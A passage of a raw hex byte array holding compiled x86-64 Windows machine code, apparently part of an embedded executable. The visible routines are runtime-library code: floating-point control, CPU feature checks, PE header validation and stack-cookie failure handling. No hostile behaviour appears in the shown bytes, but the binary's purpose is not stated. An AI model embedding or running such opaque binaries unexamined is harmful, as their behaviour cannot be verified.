0xc0, 0x75, 0x7, 0x8b, 0xcb, 0xe8, 0xc3, 0x6, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x50, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0x48, 0x8b, 0xf2, 0x83, 0xe3, 0x1f, 0x8b, 0xf9, 0xf6, 0xc1, 0x8, 0x74, 0x14, 0x40, 0x84, 0xf6, 0x79, 0xf, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x53, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xf7, 0xeb, 0x57, 0xb9, 0x4, 0x0, 0x0, 0x0, 0x40, 0x84, 0xf9, 0x74, 0x11, 0x48, 0xf, 0xba, 0xe6, 0x9, 0x73, 0xa, 0xe8, 0x38, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xfb, 0xeb, 0x3c, 0x40, 0xf6, 0xc7, 0x1, 0x74, 0x16, 0x48, 0xf, 0xba, 0xe6, 0xa, 0x73, 0xf, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x1c, 0x7, 0x0, 0x0, 0x83, 0xe3, 0xfe, 0xeb, 0x20, 0x40, 0xf6, 0xc7, 0x2, 0x74, 0x1a, 0x48, 0xf, 0xba, 0xe6, 0xb, 0x73, 0x13, 0x40, 0xf6, 0xc7, 0x10, 0x74, 0xa, 0xb9, 0x10, 0x0, 0x0, 0x0, 0xe8, 0xfa, 0x6, 0x0, 0x0, 0x83, 0xe3, 0xfd, 0x40, 0xf6, 0xc7, 0x10, 0x74, 0x14, 0x48, 0xf, 0xba, 0xe6, 0xc, 0x73, 0xd, 0xb9, 0x20, 0x0, 0x0, 0x0, 0xe8, 0xe0, 0x6, 0x0, 0x0, 0x83, 0xe3, 0xef, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x33, 0xc0, 0x85, 0xdb, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0xf, 0x94, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x55, 0x53, 0x56, 0x57, 0x41, 0x56, 0x48, 0x8d, 0x68, 0xc9, 0x48, 0x81, 0xec, 0xe0, 0x0, 0x0, 0x0, 0xf, 0x29, 0x70, 0xc8, 0x48, 0x8b, 0x5, 0x1, 0xba, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x45, 0xef, 0x8b, 0xf2, 0x4c, 0x8b, 0xf1, 0xba, 0xc0, 0xff, 0x0, 0x0, 0xb9, 0x80, 0x1f, 0x0, 0x0, 0x41, 0x8b, 0xf9, 0x49, 0x8b, 0xd8, 0xe8, 0x8, 0x6, 0x0, 0x0, 0x8b, 0x4d, 0x5f, 0x48, 0x89, 0x44, 0x24, 0x48, 0x48, 0x89, 0x5c, 0x24, 0x40, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x54, 0x24, 0x48, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x40, 0xe8, 0xe1, 0xfe, 0xff, 0xff, 0xf2, 0xf, 0x10, 0x75, 0x77, 0x85, 0xc0, 0x75, 0x40, 0x83, 0x7d, 0x7f, 0x2, 0x75, 0x11, 0x8b, 0x45, 0xbf, 0x83, 0xe0, 0xe3, 0xf2, 0xf, 0x11, 0x75, 0xaf, 0x83, 0xc8, 0x3, 0x89, 0x45, 0xbf, 0x44, 0x8b, 0x45, 0x5f, 0x48, 0x8d, 0x44, 0x24, 0x40, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8d, 0x54, 0x24, 0x48, 0x48, 0x8d, 0x45, 0x6f, 0x44, 0x8b, 0xce, 0x48, 0x8d, 0x4c, 0x24, 0x50, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x14, 0x2, 0x0, 0x0, 0xe8, 0xe7, 0xbb, 0xff, 0xff, 0x84, 0xc0, 0x74, 0x34, 0x85, 0xff, 0x74, 0x30, 0x48, 0x8b, 0x44, 0x24, 0x48, 0x4d, 0x8b, 0xc6, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x8b, 0xcf, 0xf2, 0xf, 0x10, 0x5d, 0x6f, 0x8b, 0x55, 0x67, 0x48, 0x89, 0x44, 0x24, 0x30, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x28, 0xf2, 0xf, 0x11, 0x74, 0x24, 0x20, 0xe8, 0xf5, 0xfd, 0xff, 0xff, 0xeb, 0x1c, 0x8b, 0xcf, 0xe8, 0x8, 0x5, 0x0, 0x0, 0x48, 0x8b, 0x4c, 0x24, 0x48, 0xba, 0xc0, 0xff, 0x0, 0x0, 0xe8, 0x49, 0x5, 0x0, 0x0, 0xf2, 0xf, 0x10, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x4d, 0xef, 0x48, 0x33, 0xcc, 0xe8, 0x7f, 0x7, 0x0, 0x0, 0xf, 0x28, 0xb4, 0x24, 0xd0, 0x0, 0x0, 0x0, 0x48, 0x81, 0xc4, 0xe0, 0x0, 0x0, 0x0, 0x41, 0x5e, 0x5f, 0x5e, 0x5b, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x10, 0x45, 0x33, 0xc0, 0x33, 0xc9, 0x44, 0x89, 0x5, 0x56, 0xcf, 0x0, 0x0, 0x45, 0x8d, 0x48, 0x1, 0x41, 0x8b, 0xc1, 0xf, 0xa2, 0x89, 0x4, 0x24, 0xb8, 0x0, 0x10, 0x0, 0x18, 0x89, 0x4c, 0x24, 0x8, 0x23, 0xc8, 0x89, 0x5c, 0x24, 0x4, 0x89, 0x54, 0x24, 0xc, 0x3b, 0xc8, 0x75, 0x2c, 0x33, 0xc9, 0xf, 0x1, 0xd0, 0x48, 0xc1, 0xe2, 0x20, 0x48, 0xb, 0xd0, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8b, 0x44, 0x24, 0x20, 0x44, 0x8b, 0x5, 0x16, 0xcf, 0x0, 0x0, 0x24, 0x6, 0x3c, 0x6, 0x45, 0xf, 0x44, 0xc1, 0x44, 0x89, 0x5, 0x7, 0xcf, 0x0, 0x0, 0x44, 0x89, 0x5, 0x4, 0xcf, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x10, 0x5b, 0xc3, 0x48, 0x83, 0xec, 0x38, 0x48, 0x8d, 0x5, 0xd5, 0x8e, 0x0, 0x0, 0x41, 0xb9, 0x1b, 0x0, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x5, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0x48, 0x8b, 0xc4, 0x48, 0x83, 0xec, 0x68, 0xf, 0x29, 0x70, 0xe8, 0xf, 0x28, 0xf1, 0x41, 0x8b, 0xd1, 0xf, 0x28, 0xd8, 0x41, 0x83, 0xe8, 0x1, 0x74, 0x2a, 0x41, 0x83, 0xf8, 0x1, 0x75, 0x69, 0x44, 0x89, 0x40, 0xd8, 0xf, 0x57, 0xd2, 0xf2, 0xf, 0x11, 0x50, 0xd0, 0x45, 0x8b, 0xc8, 0xf2, 0xf, 0x11, 0x40, 0xc8, 0xc7, 0x40, 0xc0, 0x21, 0x0, 0x0, 0x0, 0xc7, 0x40, 0xb8, 0x8, 0x0, 0x0, 0x0, 0xeb, 0x2d, 0xc7, 0x44, 0x24, 0x40, 0x1, 0x0, 0x0, 0x0, 0xf, 0x57, 0xc0, 0xf2, 0xf, 0x11, 0x44, 0x24, 0x38, 0x41, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x5c, 0x24, 0x30, 0xc7, 0x44, 0x24, 0x28, 0x22, 0x0, 0x0, 0x0, 0xc7, 0x44, 0x24, 0x20, 0x4, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x8c, 0x24, 0x90, 0x0, 0x0, 0x0, 0xf2, 0xf, 0x11, 0x74, 0x24, 0x78, 0x4c, 0x8b, 0x44, 0x24, 0x78, 0xe8, 0xb7, 0xfd, 0xff, 0xff, 0xf, 0x28, 0xc6, 0xf, 0x28, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x68, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x8, 0xf, 0xae, 0x1c, 0x24, 0x8b, 0x4, 0x24, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0x89, 0x4c, 0x24, 0x8, 0xf, 0xae, 0x54, 0x24, 0x8, 0xc3, 0xf, 0xae, 0x5c, 0x24, 0x8, 0xb9, 0xc0, 0xff, 0xff, 0xff, 0x21, 0x4c, 0x24, 0x8, 0xf, 0xae, 0x54, 0x24, 0x8, 0xc3, 0x66, 0xf, 0x2e, 0x5, 0xea, 0x8d, 0x0, 0x0, 0x73, 0x14, 0x66, 0xf, 0x2e, 0x5, 0xe8, 0x8d, 0x0, 0x0, 0x76, 0xa, 0xf2, 0x48, 0xf, 0x2d, 0xc8, 0xf2, 0x48, 0xf, 0x2a, 0xc1, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x48, 0x83, 0x64, 0x24, 0x30, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x78, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x70, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x48, 0xc3, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x48, 0x89, 0x48, 0x8, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x41, 0x8b, 0xf1, 0x33, 0xd2, 0xbf, 0xd, 0x0, 0x0, 0xc0, 0x89, 0x51, 0x4, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x50, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x50, 0xc, 0x41, 0xf6, 0xc0, 0x10, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x8f, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x1, 0x41, 0xf6, 0xc0, 0x2, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x93, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x2, 0x41, 0xf6, 0xc0, 0x1, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x91, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x4, 0x41, 0xf6, 0xc0, 0x4, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x8e, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x8, 0x41, 0xf6, 0xc0, 0x8, 0x74, 0xd, 0x48, 0x8b, 0x45, 0x10, 0xbf, 0x90, 0x0, 0x0, 0xc0, 0x83, 0x48, 0x4, 0x10, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0x7, 0xc1, 0xe0, 0x4, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x10, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0x9, 0xc1, 0xe0, 0x3, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x8, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0xa, 0xc1, 0xe0, 0x2, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x4, 0x31, 0x41, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0x8b, 0x3, 0x48, 0xc1, 0xe8, 0xb, 0x3, 0xc0, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x2, 0x31, 0x41, 0x8, 0x8b, 0x3, 0x48, 0x8b, 0x4d, 0x10, 0x48, 0xc1, 0xe8, 0xc, 0xf7, 0xd0, 0x33, 0x41, 0x8, 0x83, 0xe0, 0x1, 0x31, 0x41, 0x8, 0xe8, 0xe7, 0x2, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0xa8, 0x1, 0x74, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x83, 0x49, 0xc, 0x10, 0xf6, 0xc2, 0x4, 0x74, 0x8, 0x48, 0x8b, 0x4d, 0x10, 0x83, 0x49, 0xc, 0x8, 0xf6, 0xc2, 0x8, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x4, 0xf6, 0xc2, 0x10, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x2, 0xf6, 0xc2, 0x20, 0x74, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0xc, 0x1, 0x8b, 0x3, 0xb9, 0x0, 0x60, 0x0, 0x0, 0x48, 0x23, 0xc1, 0x74, 0x3e, 0x48, 0x3d, 0x0, 0x20, 0x0, 0x0, 0x74, 0x26, 0x48, 0x3d, 0x0, 0x40, 0x0, 0x0, 0x74, 0xe, 0x48, 0x3b, 0xc1, 0x75, 0x30, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x3, 0xeb, 0x27, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfe, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x2, 0xeb, 0x17, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfd, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x8, 0x1, 0xeb, 0x7, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x20, 0xfc, 0x48, 0x8b, 0x45, 0x10, 0x81, 0xe6, 0xff, 0xf, 0x0, 0x0, 0xc1, 0xe6, 0x5, 0x81, 0x20, 0x1f, 0x0, 0xfe, 0xff, 0x48, 0x8b, 0x45, 0x10, 0x9, 0x30, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x8b, 0x75, 0x38, 0x83, 0x48, 0x20, 0x1, 0x83, 0x7d, 0x40, 0x0, 0x74, 0x33, 0x48, 0x8b, 0x45, 0x10, 0xba, 0xe1, 0xff, 0xff, 0xff, 0x21, 0x50, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x8b, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x89, 0x48, 0x10, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0x60, 0x1, 0x48, 0x8b, 0x45, 0x10, 0x21, 0x50, 0x60, 0x48, 0x8b, 0x45, 0x10, 0x8b, 0xe, 0x89, 0x48, 0x50, 0xeb, 0x48, 0x48, 0x8b, 0x4d, 0x10, 0x41, 0xb8, 0xe3, 0xff, 0xff, 0xff, 0x8b, 0x41, 0x20, 0x41, 0x23, 0xc0, 0x83, 0xc8, 0x2, 0x89, 0x41, 0x20, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x89, 0x48, 0x10, 0x48, 0x8b, 0x45, 0x10, 0x83, 0x48, 0x60, 0x1, 0x48, 0x8b, 0x55, 0x10, 0x8b, 0x42, 0x60, 0x41, 0x23, 0xc0, 0x83, 0xc8, 0x2, 0x89, 0x42, 0x60, 0x48, 0x8b, 0x45, 0x10, 0x48, 0x8b, 0x16, 0x48, 0x89, 0x50, 0x50, 0xe8, 0xec, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x4c, 0x8d, 0x4d, 0x10, 0x8b, 0xcf, 0x44, 0x8d, 0x42, 0x1, 0xff, 0x15, 0xf2, 0x14, 0x0, 0x0, 0x48, 0x8b, 0x4d, 0x10, 0x8b, 0x41, 0x8, 0xa8, 0x10, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0x7, 0x8b, 0x41, 0x8, 0xa8, 0x8, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0x9, 0x8b, 0x41, 0x8, 0xa8, 0x4, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0xa, 0x8b, 0x41, 0x8, 0xa8, 0x2, 0x74, 0x8, 0x48, 0xf, 0xba, 0x33, 0xb, 0x8b, 0x41, 0x8, 0xa8, 0x1, 0x74, 0x5, 0x48, 0xf, 0xba, 0x33, 0xc, 0x8b, 0x1, 0x83, 0xe0, 0x3, 0x74, 0x30, 0x83, 0xe8, 0x1, 0x74, 0x1f, 0x83, 0xe8, 0x1, 0x74, 0xe, 0x83, 0xf8, 0x1, 0x75, 0x28, 0x48, 0x81, 0xb, 0x0, 0x60, 0x0, 0x0, 0xeb, 0x1f, 0x48, 0xf, 0xba, 0x33, 0xd, 0x48, 0xf, 0xba, 0x2b, 0xe, 0xeb, 0x13, 0x48, 0xf, 0xba, 0x33, 0xe, 0x48, 0xf, 0xba, 0x2b, 0xd, 0xeb, 0x7, 0x48, 0x81, 0x23, 0xff, 0x9f, 0xff, 0xff, 0x83, 0x7d, 0x40, 0x0, 0x74, 0x7, 0x8b, 0x41, 0x50, 0x89, 0x6, 0xeb, 0x7, 0x48, 0x8b, 0x41, 0x50, 0x48, 0x89, 0x6, 0x48, 0x8b, 0x5c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x8b, 0x7c, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5d, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x83, 0xf9, 0x1, 0x74, 0x15, 0x8d, 0x41, 0xfe, 0x83, 0xf8, 0x1, 0x77, 0x18, 0xe8, 0x5a, 0x8e, 0xff, 0xff, 0xc7, 0x0, 0x22, 0x0, 0x0, 0x0, 0xeb, 0xb, 0xe8, 0x4d, 0x8e, 0xff, 0xff, 0xc7, 0x0, 0x21, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0xe8, 0x3d, 0xfc, 0xff, 0xff, 0x8b, 0xd8, 0x83, 0xe3, 0x3f, 0xe8, 0x4d, 0xfc, 0xff, 0xff, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0xe8, 0xe, 0xfc, 0xff, 0xff, 0x8b, 0xf0, 0x89, 0x44, 0x24, 0x38, 0x8b, 0xcb, 0xf7, 0xd1, 0x81, 0xc9, 0x7f, 0x80, 0xff, 0xff, 0x23, 0xc8, 0x23, 0xfb, 0xb, 0xcf, 0x89, 0x4c, 0x24, 0x30, 0x80, 0x3d, 0x5d, 0xbd, 0x0, 0x0, 0x0, 0x74, 0x25, 0xf6, 0xc1, 0x40, 0x74, 0x20, 0xe8, 0xf1, 0xfb, 0xff, 0xff, 0xeb, 0x21, 0xc6, 0x5, 0x48, 0xbd, 0x0, 0x0, 0x0, 0x8b, 0x4c, 0x24, 0x30, 0x83, 0xe1, 0xbf, 0xe8, 0xdc, 0xfb, 0xff, 0xff, 0x8b, 0x74, 0x24, 0x38, 0xeb, 0x8, 0x83, 0xe1, 0xbf, 0xe8, 0xce, 0xfb, 0xff, 0xff, 0x8b, 0xc6, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x74, 0x24, 0x48, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0xe8, 0x9e, 0xfb, 0xff, 0xff, 0x83, 0xe3, 0x3f, 0xb, 0xc3, 0x8b, 0xc8, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xe9, 0x9d, 0xfb, 0xff, 0xff, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x83, 0xfb, 0xff, 0xff, 0x83, 0xe0, 0x3f, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x4c, 0x63, 0x41, 0x3c, 0x45, 0x33, 0xc9, 0x4c, 0x3, 0xc1, 0x4c, 0x8b, 0xd2, 0x41, 0xf, 0xb7, 0x40, 0x14, 0x45, 0xf, 0xb7, 0x58, 0x6, 0x48, 0x83, 0xc0, 0x18, 0x49, 0x3, 0xc0, 0x45, 0x85, 0xdb, 0x74, 0x1e, 0x8b, 0x50, 0xc, 0x4c, 0x3b, 0xd2, 0x72, 0xa, 0x8b, 0x48, 0x8, 0x3, 0xca, 0x4c, 0x3b, 0xd1, 0x72, 0xe, 0x41, 0xff, 0xc1, 0x48, 0x83, 0xc0, 0x28, 0x45, 0x3b, 0xcb, 0x72, 0xe2, 0x33, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x48, 0x8d, 0x3d, 0x7c, 0x21, 0xff, 0xff, 0x48, 0x8b, 0xcf, 0xe8, 0x34, 0x0, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x22, 0x48, 0x2b, 0xdf, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0xe8, 0x82, 0xff, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0xf, 0x8b, 0x40, 0x24, 0xc1, 0xe8, 0x1f, 0xf7, 0xd0, 0x83, 0xe0, 0x1, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0xb8, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x1, 0x75, 0x20, 0x48, 0x63, 0x41, 0x3c, 0x48, 0x3, 0xc1, 0x81, 0x38, 0x50, 0x45, 0x0, 0x0, 0x75, 0x11, 0xb9, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x48, 0x18, 0x75, 0x6, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc3, 0x33, 0xc0, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8d, 0x5, 0xcb, 0x88, 0x0, 0x0, 0x48, 0x8b, 0xd9, 0x48, 0x89, 0x1, 0xf6, 0xc2, 0x1, 0x74, 0xa, 0xba, 0x18, 0x0, 0x0, 0x0, 0xe8, 0xbe, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x4d, 0x8b, 0x41, 0x38, 0x48, 0x8b, 0xca, 0x49, 0x8b, 0xd1, 0xe8, 0xd, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x45, 0x8b, 0x18, 0x48, 0x8b, 0xda, 0x41, 0x83, 0xe3, 0xf8, 0x4c, 0x8b, 0xc9, 0x41, 0xf6, 0x0, 0x4, 0x4c, 0x8b, 0xd1, 0x74, 0x13, 0x41, 0x8b, 0x40, 0x8, 0x4d, 0x63, 0x50, 0x4, 0xf7, 0xd8, 0x4c, 0x3, 0xd1, 0x48, 0x63, 0xc8, 0x4c, 0x23, 0xd1, 0x49, 0x63, 0xc3, 0x4a, 0x8b, 0x14, 0x10, 0x48, 0x8b, 0x43, 0x10, 0x8b, 0x48, 0x8, 0x48, 0x8b, 0x43, 0x8, 0xf6, 0x44, 0x1, 0x3, 0xf, 0x74, 0xb, 0xf, 0xb6, 0x44, 0x1, 0x3, 0x83, 0xe0, 0xf0, 0x4c, 0x3, 0xc8, 0x4c, 0x33, 0xca, 0x49, 0x8b, 0xc9, 0x5b, 0xe9, 0x19, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x3b, 0xd, 0x89, 0xb1, 0x0, 0x0, 0x75, 0x10, 0x48, 0xc1, 0xc1, 0x10, 0x66, 0xf7, 0xc1, 0xff, 0xff, 0x75, 0x1, 0xc3, 0x48, 0xc1, 0xc9, 0x10, 0xe9, 0x3e, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0xe9, 0x8b, 0x3, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xd9, 0x33, 0xc9, 0xff, 0x15, 0xcf, 0x10, 0x0, 0x0, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0xbe, 0x10, 0x0, 0x0, 0xff, 0x15, 0x78, 0x11, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0xba, 0x9, 0x4, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0x48, 0xff, 0x25, 0x74, 0x11, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x38, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xa8, 0x10, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x48, 0x8d, 0xd, 0x2e, 0xc8, 0x0, 0x0, 0xe8, 0xc9, 0x1, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x89, 0x5, 0x15, 0xc9, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x5, 0xa5, 0xc8, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xfe, 0xc8, 0x0, 0x0, 0x48, 0x89, 0x5, 0x6f, 0xc7, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x40, 0x48, 0x89, 0x5, 0x73, 0xc8, 0x0, 0x0, 0xc7, 0x5, 0x49, 0xc7, 0x0, 0x0, 0x9, 0x4, 0x0, 0xc0, 0xc7, 0x5, 0x43, 0xc7, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x5, 0x4d, 0xc7, 0x0, 0x0, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8d, 0xd, 0x45, 0xc7, 0x0, 0x0, 0x48, 0xc7, 0x4, 0x1, 0x2, 0x0, 0x0, 0x0, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x0, 0x48, 0x8b, 0xd, 0x8d, 0xb0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x4, 0x20, 0xb8, 0x8, 0x0, 0x0, 0x0, 0x48, 0x6b, 0xc0, 0x1, 0x48, 0x8b, 0xd, 0x70, 0xb0, 0x0, 0x0, 0x48, 0x89, 0x4c, 0x4, 0x20, 0x48, 0x8d, 0xd, 0xfc, 0x86, 0x0, 0x0, 0xe8, 0xff, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x8, 0x0, 0x0, 0x0, 0xe8, 0x6, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x89, 0x4c, 0x24, 0x8, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0xc1, 0xf, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x8, 0x8b, 0x44, 0x24, 0x30, 0x8b, 0xc8, 0xcd, 0x29, 0x48, 0x8d, 0xd, 0x46, 0xc7, 0x0, 0x0, 0xe8, 0x71, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x44, 0x24, 0x28, 0x48, 0x89, 0x5, 0x2d, 0xc8, 0x0, 0x0, 0x48, 0x8d, 0x44, 0x24, 0x28, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x89, 0x5, 0xbd, 0xc7, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x16, 0xc8, 0x0, 0x0, 0x48, 0x89, 0x5, 0x87, 0xc6, 0x0, 0x0, 0xc7, 